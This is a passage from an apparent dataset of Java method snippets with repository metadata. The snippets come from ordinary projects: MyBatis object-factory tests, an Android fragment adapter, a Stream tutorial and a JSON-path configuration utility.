Collections.singletonList(String.class), Collections.singletonList(\"foo\"));\n      Assertions.fail(\"Should have thrown ReflectionException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof ReflectionException, \"Should be ReflectionException\");\n      Assertions.assertTrue(e.getMessage().contains(\"(String)\"), \"Should not have trailing commas in types list\");\n      Assertions.assertTrue(e.getMessage().contains(\"(foo)\"), \"Should not have trailing commas in values list\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30577, "method_name": "creatHashMap", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void creatHashMap() {\n     DefaultObjectFactory defaultObjectFactory=new DefaultObjectFactory();\n     Map  map= defaultObjectFactory.create(Map.class,null,null);\n     Assertions.assertTrue(map instanceof HashMap, \"Should be HashMap\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30578, "method_name": "createArrayList", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createArrayList() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    List list = defaultObjectFactory.create(List.class);\n    Assertions.assertTrue(list instanceof ArrayList, \" list should be ArrayList\");\n\n    Collection collection = defaultObjectFactory.create(Collection.class);\n    Assertions.assertTrue(collection instanceof ArrayList, \" collection should be ArrayList\");\n\n    Iterable iterable = defaultObjectFactory.create(Iterable.class);\n    Assertions.assertTrue(iterable instanceof ArrayList, \" iterable should be ArrayList\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30579, "method_name": "createTreeSet", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createTreeSet() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    SortedSet sortedSet = defaultObjectFactory.create(SortedSet.class);\n    Assertions.assertTrue(sortedSet instanceof TreeSet, \" sortedSet should be TreeSet\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30580, "method_name": "createHashSet", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createHashSet() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    Set set = defaultObjectFactory.create(Set.class);\n    Assertions.assertTrue(set instanceof HashSet, \" set should be HashSet\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30581, "method_name": "getItem", "class_name": "BaseFragmentAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "F", "snippet": "    public F getItem(int position) {\n        return mFragmentSet.get(position);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30582, "method_name": "getCount", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return mFragmentSet.size();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30583, "method_name": "setPrimaryItem", "class_name": "BaseFragmentAdapter", "params": ["ViewGroup", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPrimaryItem(@NonNull ViewGroup container, int position, @NonNull Object object) {\n        if (getCurrentFragment() != object) {\n            // \u8bb0\u5f55\u5f53\u524d\u7684Fragment\u5bf9\u8c61\n            mCurrentFragment = (F) object;\n        }\n        super.setPrimaryItem(container, position, object);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30584, "method_name": "addFragment", "class_name": "BaseFragmentAdapter", "params": ["F"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFragment(F fragment) {\n        mFragmentSet.add(fragment);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30585, "method_name": "getAllFragment", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<F>", "snippet": "    public List<F> getAllFragment() {\n        return mFragmentSet;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30586, "method_name": "getCurrentFragment", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "F", "snippet": "    public F getCurrentFragment() {\n        return mCurrentFragment;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30587, "method_name": "startUpdate", "class_name": "BaseFragmentAdapter", "params": ["ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startUpdate(@NonNull ViewGroup container) {\n        super.startUpdate(container);\n        if (container instanceof ViewPager) {\n            // \u8bb0\u5f55\u7ed1\u5b9a ViewPager\n            mViewPager = (ViewPager) container;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30588, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["Class<F>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(Class<? extends F> clazz) {\n        for (int i = 0; i < mFragmentSet.size(); i++) {\n            if (mFragmentSet.get(i).getClass() == clazz) {\n                setCurrentItem(i);\n                break;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30589, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(int position) {\n        if (mViewPager != null) {\n            mViewPager.setCurrentItem(position);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30590, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(int position, boolean smoothScroll) {\n        if (mViewPager != null) {\n            mViewPager.setCurrentItem(position, smoothScroll);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 30591, "method_name": "main", "class_name": "Demo03Stream_filter", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2aStream\u6d41\n        Stream<String> stream = Stream.of(\"\u5f20\u4e09\u4e30\", \"\u5f20\u7fe0\u5c71\", \"\u8d75\u654f\", \"\u5468\u82b7\u82e5\", \"\u5f20\u65e0\u5fcc\");\n        //\u5bf9Stream\u6d41\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u59d3\u5f20\u7684\u4eba\n        Stream<String> stream2 = stream.filter((String name)->{return name.startsWith(\"\u5f20\");});\n        //\u904d\u5386stream2\u6d41\n        stream2.forEach(name-> System.out.println(name));\n\n        /*\n            Stream\u6d41\u5c5e\u4e8e\u7ba1\u9053\u6d41,\u53ea\u80fd\u88ab\u6d88\u8d39(\u4f7f\u7528)\u4e00\u6b21\n            \u7b2c\u4e00\u4e2aStream\u6d41\u8c03\u7528\u5b8c\u6bd5\u65b9\u6cd5,\u6570\u636e\u5c31\u4f1a\u6d41\u8f6c\u5230\u4e0b\u4e00\u4e2aStream\u4e0a\n            \u800c\u8fd9\u65f6\u7b2c\u4e00\u4e2aStream\u6d41\u5df2\u7ecf\u4f7f\u7528\u5b8c\u6bd5,\u5c31\u4f1a\u5173\u95ed\u4e86\n            \u6240\u4ee5\u7b2c\u4e00\u4e2aStream\u6d41\u5c31\u4e0d\u80fd\u518d\u8c03\u7528\u65b9\u6cd5\u4e86\n            IllegalStateException: stream has already been operated upon or closed\n         */\n        //\u904d\u5386stream\u6d41\n        stream.forEach(name-> System.out.println(name));\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo02/Stream/Demo03Stream_filter.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30592, "method_name": "getFirst", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getFirst() {\n\t\treturn first;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30593, "method_name": "getSecond", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getSecond() {\n\t\treturn second;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30594, "method_name": "getThird", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getThird() {\n\t\treturn third;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30595, "method_name": "indent", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\n\t\tif (this.first != null) {\n\t\t\tfirst.setIndent(getIndent());\n\t\t\tfirst.indent();\n\t\t}\n\t\tif (second != null) {\n\t\t\tsecond.setIndent(getIndent());\n\t\t\tsecond.indent();\n\t\t}\n\t\tif (third != null) {\n\t\t\tthird.setIndent(getIndent());\n\t\t\tthird.indent();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30596, "method_name": "markWebGetCall", "class_name": "WebMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markWebGetCall() {\n    this.webGetCall.mark();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30597, "method_name": "markWebPostCall", "class_name": "WebMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markWebPostCall() {\n    this.webPostCall.mark();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30598, "method_name": "setFetchLogLatency", "class_name": "WebMetrics", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFetchLogLatency(final long milliseconds) {\n    this.logFetchLatency.set(milliseconds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30599, "method_name": "from", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "TaskConfiguration", "snippet": "    public static TaskConfiguration from(String json){\n        json = PatternInjectUtils.inject(json, new String[]{});\n        return new TaskConfiguration(json);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30600, "method_name": "searchKeyToInsertValue", "class_name": "TaskConfiguration", "params": ["TaskConfiguration", "String", "String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean searchKeyToInsertValue(TaskConfiguration configuration, String path,\n                                                 String key, Object value){\n        TaskConfiguration subConf = configuration.getConfiguration(path);\n        Set<String> keys = subConf.getKeys();\n        //search key\n        for(String key0 : keys){\n            if(key0.endsWith(SPLIT_CHAR + key)){\n                configuration.set(StringUtils.join(new String[]{path, key0}, SPLIT_CHAR), value);\n                return true;\n            }\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30601, "method_name": "searchKeyPaths", "class_name": "TaskConfiguration", "params": ["TaskConfiguration", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> searchKeyPaths(TaskConfiguration configuration, String path,\n                                         String key){\n        List<String> result = new ArrayList<>();\n        TaskConfiguration subConf = configuration.getConfiguration(path);\n        Set<String> keys = subConf.getKeys();\n        keys.forEach(key0 -> {\n            if(key0.equals(key) || key0.endsWith(SPLIT_CHAR + key)){\n                result.add(key0);\n            }\n        });\n        return result;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30602, "method_name": "toJson", "class_name": "TaskConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toJson(){\n        return Json.toJson(root, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30603, "method_name": "set", "class_name": "TaskConfiguration", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object set(final String path, final Object object) {\n        if(!checkPath(path)){\n            return null;\n        }\n        Object result = this.get(path);\n        setObject(path, extract(object));\n        return result;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30604, "method_name": "get", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object get(final String path){\n        this.checkPath(path);\n        return this.findObject(path);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30605, "method_name": "getString", "class_name": "TaskConfiguration", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(final String path, String defaultValue){\n        Object result = this.get(path);\n        if(null == result){\n            return defaultValue;\n        }\n        if(result instanceof String){\n            return (String)result;\n        }else if(result.getClass().isPrimitive() || isWrapClass(result.getClass())){\n            return String.valueOf(result);\n        }else{\n            return Json.toJson(result, null);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30606, "method_name": "getInt", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getInt(final String path){\n        String result = this.getString(path);\n        if(null == result){\n            return null;\n        }\n        return Integer.valueOf(result);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30607, "method_name": "getString", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(final String path){\n        return getString(path, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30608, "method_name": "getKeys", "class_name": "TaskConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "    public Set<String> getKeys(){\n        return getKeys(Integer.MAX_VALUE);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30609, "method_name": "getKeys", "class_name": "TaskConfiguration", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "    public Set<String> getKeys(int maxDepth){\n        Set<String> collect = new HashSet<>();\n        this.getKeysRecursive(this.root, \"\", collect, maxDepth);\n        return collect;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30610, "method_name": "getConfiguration", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "TaskConfiguration", "snippet": "    public TaskConfiguration getConfiguration(final String path){\n        Object object = this.get(path);\n        if(null == object){\n            return null;\n        }\n        return TaskConfiguration.from(Json.toJson(object, null));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30611, "method_name": "findObject", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object findObject(final String path){\n        if(StringUtils.isBlank(path)){\n            return this.root;\n        }\n        Object target = this.root;\n        for(final String each : split2List(path)){\n            if(isPathMap(each) && target instanceof Map){\n                target = ((Map<String, Object>)target).get(each);\n            }else if (isPathList(each) && target instanceof List){\n                String index = each.replace(\"[\", \"\").replace(\"]\", \"\");\n                if(!StringUtils.isNumeric(index)){\n                    throw new IllegalArgumentException(\"index value must be numeric, value: \" + index);\n                }\n                target = ((List<Object>)target).get(Integer.valueOf(index));\n            }else{\n                target = null;\n                break;\n            }\n        }\n        return target;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30612, "method_name": "setObject", "class_name": "TaskConfiguration", "params": ["String", "Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setObject(final String path, final Object object){\n        Object newRoot = setObjectRecursive(this.root, split2List(path), 0, object);\n        boolean isSuit = null != newRoot && (newRoot instanceof List || object instanceof Map);\n        if(isSuit){\n            this.root = newRoot;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30613, "method_name": "setObjectRecursive", "class_name": "TaskConfiguration", "params": ["Object", "List<String>", "int", "Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object setObjectRecursive(Object current, final List<String> paths,\n                                      int index, final Object value){\n        if(index >= paths.size()){\n            return value;\n        }\n        String path = paths.get(index).trim();\n        if(isPathMap(path)){\n            //current object is not map\n            Map<String, Object> mapping;\n            if(!(current instanceof Map)){\n                mapping = new HashMap<>(1);\n                mapping.put(path, buildObject(paths.subList(index + 1, paths.size()), value));\n                return mapping;\n            }\n            mapping = (Map<String, Object>)current;\n            //current map does not have key\n            if(!mapping.containsKey(path)){\n                mapping.put(path, buildObject(paths.subList(index + 1, paths.size()), value));\n                return mapping;\n            }\n            mapping.put(path, setObjectRecursive(mapping.get(path),\n                    paths, index + 1, value));\n            return mapping;\n        }\n        if(isPathList(path)){\n            List<Object> lists;\n            int listIndex = getIndex(path);\n            //current object is not list\n            if(!(current instanceof List)){\n               lists = expand(new ArrayList<>(listIndex + 1), listIndex + 1);\n               lists.set(listIndex, buildObject(paths.subList(index + 1, paths.size()), value));\n               return lists;\n            }\n            lists = (List<Object>) current;\n            lists = expand(lists, listIndex + 1);\n            //current list does not have the index\n            if(null == lists.get(listIndex)){\n                lists.set(listIndex, buildObject(paths.subList(index + 1, paths.size()), value));\n                return lists;\n            }\n            lists.set(listIndex, setObjectRecursive(lists.get(listIndex),\n                    paths, index + 1, value));\n            return lists;\n        }\n        throw new RuntimeException(\"system error\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30614, "method_name": "buildObject", "class_name": "TaskConfiguration", "params": ["List<String>", "Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object buildObject(final List<String> paths, final Object object){\n        if(null == paths ){\n            throw new IllegalArgumentException(\"paths cannot be null\");\n        }\n        if(1 == paths.size() && StringUtils.isBlank(paths.get(0))){\n            return object;\n        }\n        Object child = object;\n        for(int i = paths.size() - 1; i >= 0; i--){\n            String path = paths.get(i);\n            if(isPathMap(path)){\n                Map<String, Object> mapping = new HashMap<>(1);\n                mapping.put(path, child);\n                child = mapping;\n                continue;\n            }\n            if(isPathList(path)){\n                int index = getIndex(path);\n                List<Object> lists = new ArrayList<>(index + 1);\n                expand(lists, index + 1);\n                lists.set(index, child);\n                child = lists;\n                continue;\n            }\n            throw new IllegalArgumentException(\"illegal path\");\n        }\n        return child;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30615, "method_name": "extract", "class_name": "TaskConfiguration", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object extract(final Object object){\n        if(object instanceof TaskConfiguration){\n            return ((TaskConfiguration)object).root;\n        }\n        if(object instanceof List){\n            List<Object> result = new ArrayList<>();\n            for(final Object each : (List)object){\n                result.add(extract(each));\n            }\n            return result;\n        }\n        if(object instanceof Map){\n            Map map = (Map)object;\n            Map<String, Object> result = new HashMap<>(map.size());\n            for(final Object key : map.keySet()){\n                result.put(String.valueOf(key), extract(map.get(key)));\n            }\n            return result;\n        }\n        return object;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30616, "method_name": "isPathList", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isPathList(final String path){\n        return path.contains(\"[\") && path.contains(\"]\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30617, "method_name": "isPathMap", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isPathMap(final String path){\n        return StringUtils.isNotBlank(path) && !isPathList(path);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30618, "method_name": "split2List", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "List<String>", "snippet": "    private List<String> split2List(final String path){\n        return Arrays.asList(StringUtils.split(path.replace(\"[\", \".[\"), \".\"));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30619, "method_name": "getIndex", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getIndex(final String index) {\n        return Integer.valueOf(index.replace(\"[\", \"\").replace(\"]\", \"\"));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30620, "method_name": "checkPath", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean checkPath(final String path){\n        if(null == path){\n            return false;\n        }\n        for(String each : StringUtils.split(SPLIT_CHAR)){\n            if(StringUtils.containsWhitespace(each)){\n                throw new IllegalArgumentException(\"cannot contains white space in : \" + path);\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30621, "method_name": "expand", "class_name": "TaskConfiguration", "params": ["List<Object>", "int"], "throws": null, "modifiers": ["private"], "return_type": "List<Object>", "snippet": "    private List<Object> expand(List<Object> list, int size) {\n        int expand = size - list.size();\n        while (expand-- > 0) {\n            list.add(null);\n        }\n        return list;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30622, "method_name": "getKeysRecursive", "class_name": "TaskConfiguration", "params": ["Object", "String", "Set<String>", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getKeysRecursive(final Object current, String path, Set<String> collect,int depth){\n        if(depth-- <= 0){\n            collect.add(path);\n            return;\n        }\n        if(current instanceof Map){\n            Map mapping = 